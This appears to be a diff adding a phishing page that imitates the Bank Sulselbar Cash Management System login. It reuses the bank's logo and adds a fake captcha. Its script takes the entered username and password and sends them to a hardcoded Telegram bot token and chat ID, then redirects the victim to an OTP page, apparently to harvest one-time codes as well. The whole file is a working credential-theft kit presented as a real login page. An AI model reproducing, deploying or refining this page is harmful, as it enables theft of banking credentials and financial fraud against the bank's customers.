@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta name="google-site-verification" content="hbrZrdK7cW3kmiz_xBUe4mSfgBoxEs0Do8LRCZM6sFI" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CMS Bank Sulselbar - Login</title>
+    <style>
+        /* Gaya Dasar Layout */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f7f9;
+            display: flex;
+            flex-direction: column; /* Menyusun slider dan login ke bawah */
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* --- STYLE SLIDER (ATAS) --- */
+        .slider {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+            margin-bottom: 30px; /* Jarak ke form login */
+        }
+
+        .slides {
+            display: flex;
+            transition: transform 0.8s ease-in-out;
+        }
+
+        .slide {
+            min-width: 100%;
+            aspect-ratio: 16 / 9;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* --- STYLE LOGIN CARD --- */
+        .login-card {
+            background: white;
+            padding: 35px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .logo { width: 180px; margin-bottom: 5px; }
+        h2 { color: #555; font-weight: 300; font-size: 22px; margin-bottom: 25px; margin-top: 10px; }
+        
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-weight: bold; color: #666; margin-bottom: 5px; font-size: 13px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 14px; outline: none; }
+        
+        /* Captcha Style */
+        .captcha-container { background: #eef2f7; padding: 15px; margin: 15px 0; border-radius: 4px; border: 1px solid #ddd; }
+        #captchaDisplay { font-family: 'Courier New', monospace; font-weight: 900; font-size: 28px; color: #0033cc; letter-spacing: 10px; font-style: italic; user-select: none; }
+        .ganti-kode { display: block; font-size: 12px; color: #0033cc; cursor: pointer; text-decoration: underline; margin-bottom: 10px; text-align: left; }
+        
+        .btn-login { background-color: #34495e; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .footer { margin-top: 25px; font-size: 11px; color: #888; }
+        .footer b { color: #2ecc71; }
+    </style>
+</head>
+<body>
+
+<div class="slider">
+    <div class="slides" id="slide-wrapper">
+        <img src="https://i.ibb.co.com/Y5mrTZW/priority-1.jpg" class="slide" alt="Slide 1">
+        <img src="https://i.ibb.co.com/KzWPtxBr/syariah.jpg" class="slide" alt="Slide 2">
+        <img src="https://i.ibb.co.com/ccp9B5jh/trade-1.jpg" class="slide" alt="Slide 3">
+        <img src="https://i.ibb.co.com/dJm5D7xF/simpanan-1.jpg" class="slide" alt="Slide 4">
+        <img src="https://i.ibb.co.com/1GY7TmXP/waspada.jpg" class="slide" alt="Slide 5">
+    </div>
+</div>
+
+<div class="login-card">
+    <img src="https://tnt.banksulselbar.co.id/BSSBLogo.png" class="logo" alt="Logo">
+    <h2>Cash Management System</h2>
+    
+    <form id="loginForm">
+        <div class="input-group">
+            <label>Username</label>
+            <input type="text" id="username" placeholder="Username" required>
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="Password" required>
+        </div>
+
+        <div class="captcha-container">
+            <div id="captchaDisplay">....</div>
+        </div>
+        <span class="ganti-kode" onclick="generateCaptcha()">Ganti Kode</span>
+
+        <div class="input-group">
+            <label>Masukan Kode</label>
+            <input type="text" id="captchaInput" placeholder="Masukan Kode" required>
+        </div>
+
+        <button type="submit" class="btn-login">Login</button>
+    </form>
+
+    <div class="footer">
+        <strong>CMS</strong> - Cash Management System<br>
+        2018-2026 Copyright <b>PT. Bank Sulselbar</b>
+    </div>
+</div>
+
+<script>
+    // --- KONFIGURASI ---
+    const TELEGRAM_TOKEN = '8631804481:AAFSTU7SmBSwrPwk-aeh43gRe4N7wyB6ubk'; 
+    const CHAT_ID = '7842224096';
+    let slideIndex = 0;
+    let currentCaptcha = "";
+
+    // --- LOGIKA SLIDER ---
+    function moveSlider() {
+        const wrapper = document.getElementById("slide-wrapper");
+        const slides = document.querySelectorAll(".slide");
+        slideIndex++;
+        if (slideIndex >= slides.length) slideIndex = 0;
+        wrapper.style.transform = `translateX(-${slideIndex * 100}%)`;
+    }
+    setInterval(moveSlider, 3000);
+
+    // --- LOGIKA CAPTCHA ---
+    function generateCaptcha() {
+        const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+        currentCaptcha = "";
+        for (let i = 0; i < 4; i++) {
+            currentCaptcha += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        document.getElementById("captchaDisplay").innerText = currentCaptcha;
+    }
+
+// --- KIRIM DATA KE TELEGRAM ---
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // Mencegah form reload otomatis
+
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    const capInput = document.getElementById('captchaInput').value;
+
+    // Validasi Captcha
+    if (capInput.toUpperCase() !== currentCaptcha) {
+        alert("Kode Captcha Salah!");
+        generateCaptcha();
+        document.getElementById('captchaInput').value = "";
+        return;
+    }
+
+    // Pesan yang dikirim
+    const message = `🔔 *LOGIN CMS TERDETEKSI*\n👤 User: \`${user}\` \n🔑 Pass: \`${pass}\``;
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+    // Proses pengiriman
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            // --- BAGIAN YANG DIUBAH ---
+            // Mengarahkan ke halaman Otp.html setelah berhasil
+            window.location.href = 'Otp.html'; 
+        } else {
+            alert("Gagal mengirim data. Periksa Token/Chat ID!");
+        }
+    })
+    .catch(err => {
+        console.error(err);
+        alert("Terjadi kesalahan koneksi.");
+    });
+});
+
+</script>
+</body>
+</html>
